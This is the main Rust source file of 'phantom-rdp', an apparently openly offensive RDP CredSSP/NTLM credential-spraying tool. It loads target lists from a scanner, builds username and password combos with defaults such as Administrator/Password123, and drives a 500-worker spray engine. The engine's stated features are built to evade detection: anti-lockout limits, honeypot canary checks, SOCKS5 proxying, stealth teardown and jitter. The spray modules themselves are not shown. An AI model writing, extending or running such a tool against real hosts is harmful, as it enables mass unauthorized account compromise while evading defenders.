#![allow(dead_code, unused_imports)]

#[global_allocator]
static GLOBAL: mimalloc::MiMalloc = mimalloc::MiMalloc;

mod asn1;
mod cssp;
mod engine;
mod error;
mod evasion;
mod honeypot;
mod ntlm;
mod raw;
mod rdp;
mod spnego;
mod tpkt;
mod triage;
mod ui;
mod x224;

use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::Path;
use std::sync::Arc;
use std::time::Instant;

use clap::Parser;
use engine::SprayEngine;
use triage::ResultWriter;
use ui::{EngineStats, LiveUi};

const APP_VERSION: &str = "1.0.0";

#[derive(Parser, Debug)]
#[command(
    name = "phantom-rdp",
    author = "0xjustrehan",
    version = APP_VERSION,
    about = "Next-generation high-speed RDP CredSSP/NTLM credential sprayer with anti-lockout evasion & domain triage",
    long_about = "Directly ingests phantom-scan NLA.txt targets.\n\
                  Features dual TLS (rustls + OpenSSL fallback), SOCKS5 proxy tunneling, /24 subnet interleaving,\n\
                  anti-account-lockout thresholds, catch-all honeypot canary checks, and automated domain telemetry."
)]
struct CliArgs {
    /// Path to targets file (IP:PORT or IP, e.g. NLA.txt from phantom-scan)
    #[arg(short = 'T', long = "targets")]
    targets: Option<String>,

    /// Path to usernames file, or a single username
    #[arg(short = 'U', long = "users")]
    users: Option<String>,

    /// Path to passwords file, or a single password
    #[arg(short = 'P', long = "passwords")]
    passwords: Option<String>,

    /// Path to combo file (user:pass or domain\\user:pass)
    #[arg(short = 'C', long = "combos")]
    combos: Option<String>,

    /// Domain name (default: auto-detect from target's NTLM challenge)
    #[arg(short = 'd', long = "domain", default_value = ".")]
    domain: String,

    /// Number of concurrent worker threads
    #[arg(short = 'w', long = "workers", default_value_t = 500)]
    workers: usize,

    /// Connection and authentication timeout in milliseconds
    #[arg(long = "timeout", default_value_t = 5000)]
    timeout: u64,

    /// Max attempts per host to evade Active Directory account lockout (0 = unlimited)
    #[arg(long = "max-tries", default_value_t = 2)]
    max_tries: usize,

    /// Disable /24 subnet interleaving
    #[arg(long = "no-interleave")]
    no_interleave: bool,

    /// Disable canary honeypot detection
    #[arg(long = "no-canary")]
    no_canary: bool,

    /// SOCKS5 proxy URL (e.g. socks5://127.0.0.1:1080)
    #[arg(long = "proxy")]
    proxy: Option<String>,

    /// Stealth mode: use graceful FIN teardown instead of RST
    #[arg(long = "stealth")]
    stealth: bool,

    /// Max random micro-jitter in milliseconds between probes
    #[arg(long = "jitter", default_value_t = 0)]
    jitter: u64,

    /// Output directory for results (good.txt, admin.txt, detailed.txt, honeypots.txt)
    #[arg(short = 'o', long = "output", default_value = "./results")]
    output: String,

    /// Disable TUI dashboard, print raw hits to stdout
    #[arg(long = "no-tui")]
    no_tui: bool,

    /// Quiet mode: suppress non-essential output
    #[arg(long = "quiet")]
    quiet: bool,

    /// Interactive wizard mode
    #[arg(short = 'i', long = "interactive")]
    interactive: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = CliArgs::parse();

    let (targets_file, user_arg, pass_arg, combo_file) = if args.interactive
        || (args.targets.is_none() && args.combos.is_none() && args.passwords.is_none())
    {
        run_wizard()?
    } else {
        (
            args.targets.unwrap_or_else(|| "NLA.txt".to_string()),
            args.users,
            args.passwords,
            args.combos,
        )
    };

    // 1. Load Targets
    let targets = load_targets(&targets_file)?;
    if targets.is_empty() {
        eprintln!("[-] Error: Target file '{targets_file}' contains no valid targets.");
        std::process::exit(1);
    }

    // 2. Load Credentials
    let creds = load_credentials(user_arg.as_deref(), pass_arg.as_deref(), combo_file.as_deref(), &args.domain)?;
    if creds.is_empty() {
        eprintln!("[-] Error: No valid credentials loaded.");
        std::process::exit(1);
    }

    // 3. Initialize Shared Components
    let writer = Arc::new(ResultWriter::new(&args.output)?);
    let stats = Arc::new(EngineStats::default());
    let ui = Arc::new(LiveUi::new(stats.clone(), args.no_tui, args.quiet));

    let engine = Arc::new(SprayEngine::new(
        args.workers,
        args.timeout,
        args.max_tries,
        !args.no_interleave,
        !args.no_canary,
        args.jitter,
        args.proxy,
        args.stealth,
        writer,
        stats.clone(),
        ui.clone(),
    ));

    // 4. Handle Ctrl+C
    let engine_ctrlc = engine.clone();
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        engine_ctrlc.stop();
    });

    // 5. Run Engine
    let start_time = Instant::now();
    engine.run(targets, creds).await?;

    let elapsed = start_time.elapsed();
    let completed = stats.completed_tasks.load(std::sync::atomic::Ordering::Relaxed);
    let goods = stats.goods.load(std::sync::atomic::Ordering::Relaxed);
    let honeypots = stats.honeypots.load(std::sync::atomic::Ordering::Relaxed);
    let lockouts = stats.lockouts.load(std::sync::atomic::Ordering::Relaxed);
    let guarded = stats.f2b_guarded.load(std::sync::atomic::Ordering::Relaxed);

    println!("\n╔══════════════════════════════════════════════════════════════╗");
    println!("║                     SPRAY COMPLETED                          ║");
    println!("╠══════════════════════════════════════════════════════════════╣");
    println!("║ Total Probes : {completed:<45} ║");
    println!("║ Valid Hits   : {goods:<45} ║");
    println!("║ Honeypots    : {honeypots:<45} ║");
    println!("║ AD Lockouts  : {lockouts:<45} ║");
    println!("║ F2B Guarded  : {guarded:<45} ║");
    println!("║ Elapsed Time : {elapsed:<45?} ║", elapsed = format_time(elapsed));
    println!("║ Output Path  : {output:<45} ║", output = args.output);
    println!("╚══════════════════════════════════════════════════════════════╝");

    Ok(())
}

fn load_targets(path: &str) -> anyhow::Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    let mut targets = Vec::new();

    for line in reader.lines() {
        let line = line?;
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        // Normalize IP:PORT
        let entry = if trimmed.contains(':') {
            trimmed.to_string()
        } else {
            format!("{trimmed}:3389")
        };
        targets.push(entry);
    }

    Ok(targets)
}

fn load_credentials(
    user_arg: Option<&str>,
    pass_arg: Option<&str>,
    combo_arg: Option<&str>,
    domain_default: &str,
) -> anyhow::Result<Vec<(String, String, String)>> {
    let mut creds = Vec::new();

    // 1. Combo file
    if let Some(combo_path) = combo_arg {
        let file = File::open(combo_path)?;
        let reader = BufReader::new(file);
        for line in reader.lines() {
            let line = line?;
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }

            // Formats:
            // DOMAIN\user:pass
            // user:pass
            // user pass
            let (user_part, pass) = if let Some((u, p)) = trimmed.split_once(':') {
                (u.trim(), p.trim())
            } else if let Some((u, p)) = trimmed.split_once(' ') {
                (u.trim(), p.trim())
            } else {
                continue;
            };

            let (domain, user) = if let Some((d, u)) = user_part.split_once('\\') {
                (d.trim().to_string(), u.trim().to_string())
            } else {
                (domain_default.to_string(), user_part.to_string())
            };

            if !user.is_empty() {
                creds.push((domain, user, pass.to_string()));
            }
        }
        return Ok(creds);
    }

    // 2. Separate Users & Passwords (file or inline)
    let users = match user_arg {
        Some(path) if Path::new(path).exists() => {
            let f = File::open(path)?;
            let reader = BufReader::new(f);
            reader
                .lines()
                .filter_map(|l| l.ok())
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .collect()
        }
        Some(single) => vec![single.to_string()],
        None => vec!["Administrator".to_string()],
    };

    let passwords = match pass_arg {
        Some(path) if Path::new(path).exists() => {
            let f = File::open(path)?;
            let reader = BufReader::new(f);
            reader
                .lines()
                .filter_map(|l| l.ok())
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .collect()
        }
        Some(single) => vec![single.to_string()],
        None => vec!["Password123".to_string()],
    };

    for u in &users {
        let (domain, user) = if let Some((d, actual_u)) = u.split_once('\\') {
            (d.trim().to_string(), actual_u.trim().to_string())
        } else {
            (domain_default.to_string(), u.clone())
        };

        for p in &passwords {
            creds.push((domain.clone(), user.clone(), p.clone()));
        }
    }

    Ok(creds)
}

fn run_wizard() -> anyhow::Result<(String, Option<String>, Option<String>, Option<String>)> {
    use std::io::{stdin, stdout, Write};

    println!("\n\x1b[36;1m================================================================");
    println!("       ⚡ PHANTOM-RDP v1.0.0 — Interactive Configuration");
    println!("================================================================\x1b[0m");

    let default_target = if Path::new("NLA.txt").exists() {
        "NLA.txt"
    } else if Path::new("open_targets.txt").exists() {
        "open_targets.txt"
    } else {
        "targets.txt"
    };

    print!("\n[?] Target file (e.g. NLA.txt from phantom-scan) [{default_target}]: ");
    stdout().flush()?;
    let mut t_in = String::new();
    stdin().read_line(&mut t_in)?;
    let t_in = t_in.trim();
    let target = if t_in.is_empty() {
        default_target.to_string()
    } else {
        t_in.to_string()
    };

    println!("\n[+] Select Credential Input Mode:");
    println!("    1) Combo file (e.g. user:pass or domain\\user:pass)");
    println!("    2) Split Users file + Passwords file");
    println!("    3) Single Credential (e.g. Administrator:Password123)");
    print!("[?] Select option [1]: ");
    stdout().flush()?;
    let mut m_in = String::new();
    stdin().read_line(&mut m_in)?;
    let m_in = m_in.trim();

    match m_in {
        "2" => {
            print!("[?] Users file path [users.txt]: ");
            stdout().flush()?;
            let mut u_in = String::new();
            stdin().read_line(&mut u_in)?;
            let u_in = u_in.trim();
            let u_val = if u_in.is_empty() { "users.txt" } else { u_in };

            print!("[?] Passwords file path [passwords.txt]: ");
            stdout().flush()?;
            let mut p_in = String::new();
            stdin().read_line(&mut p_in)?;
            let p_in = p_in.trim();
            let p_val = if p_in.is_empty() { "passwords.txt" } else { p_in };

            Ok((target, Some(u_val.to_string()), Some(p_val.to_string()), None))
        }
        "3" => {
            print!("[?] Target Username [Administrator]: ");
            stdout().flush()?;
            let mut u_in = String::new();
            stdin().read_line(&mut u_in)?;
            let u_in = u_in.trim();
            let u_val = if u_in.is_empty() { "Administrator" } else { u_in };

            print!("[?] Target Password [Password123]: ");
            stdout().flush()?;
            let mut p_in = String::new();
            stdin().read_line(&mut p_in)?;
            let p_in = p_in.trim();
            let p_val = if p_in.is_empty() { "Password123" } else { p_in };

            Ok((target, Some(u_val.to_string()), Some(p_val.to_string()), None))
        }
        _ => {
            print!("[?] Combo file path [combos.txt]: ");
            stdout().flush()?;
            let mut c_in = String::new();
            stdin().read_line(&mut c_in)?;
            let c_in = c_in.trim();
            let c_val = if c_in.is_empty() { "combos.txt" } else { c_in };

            Ok((target, None, None, Some(c_val.to_string())))
        }
    }
}

fn format_time(d: std::time::Duration) -> String {
    let secs = d.as_secs();
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    format!("{h:02}:{m:02}:{s:02}")
}
